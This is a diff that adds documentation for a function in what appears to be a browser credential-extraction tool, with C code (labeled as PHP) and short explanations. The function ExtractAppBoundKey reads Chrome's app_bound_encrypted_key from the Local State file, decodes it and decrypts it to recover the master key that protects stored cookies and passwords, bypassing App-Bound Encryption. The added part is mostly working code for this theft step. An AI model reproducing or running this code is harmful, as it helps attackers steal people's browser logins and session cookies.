@@ -218,3 +218,55 @@ PUCHAR ReadFileContents(_In_ PWCHAR FileName, _Inout_ PULONG Size)
 }
 ```
 --> `This function opens a file, reads all of its contents into a heap-allocated memory buffer, and returns the raw bytes along with the file size for further processing.`
+
+
+### ExtractAppBoundKey
+
+```php
+BOOLEAN ExtractAppBoundKey(_In_ PSTR LocalState, _Out_ PUCHAR DecryptedKey)
+{
+    PSTR    AppBoundKey;
+    BOOLEAN Result;
+    PUCHAR  DecodedKey;
+    ULONG   KeySize;
+
+    
+
+    AppBoundKey = strstr(LocalState, "app_bound_encrypted_key");
+
+    if (AppBoundKey == 0)
+    {
+        wprintf(L"Could not find the AppBound key in the local state file\n");
+        return FALSE;
+    }
+
+    
+
+    AppBoundKey += sizeof("\"app_bound_encrypted_key\"");
+    KeySize = strchr(AppBoundKey, '"') - AppBoundKey;
+
+    
+
+    DecodedKey = Base64Decode(AppBoundKey, KeySize, &KeySize);
+
+    if (DecodedKey == 0)
+    {
+        return FALSE;
+    }
+
+    
+
+    Result = DecryptAppBoundKey(DecodedKey + sizeof(kCryptAppBoundKeyPrefix), KeySize - sizeof(kCryptAppBoundKeyPrefix), DecryptedKey); // Skip over the key's header ("APPB")
+    HeapFree(GetProcessHeap(), 0, DecodedKey);
+
+    return Result;
+}
+```
+
+The ExtractAppBoundKey function is responsible for extracting the encrypted app-bound key from the local state JSON file and decrypting it. It takes two parameters:
+
++ LocalState - The contents of the local state JSON file.
+
++ DecryptedKey - A buffer that will receive the decrypted app-bound key.
+
+--> `Extracts the app-bound key by locating the app_bound_encrypted_key in the Local State file, Base64-decoding it, removing the "APPB" header, and decrypting the remaining blob using DPAPI and AES-256-GCM to recover the plaintext AES master key.`
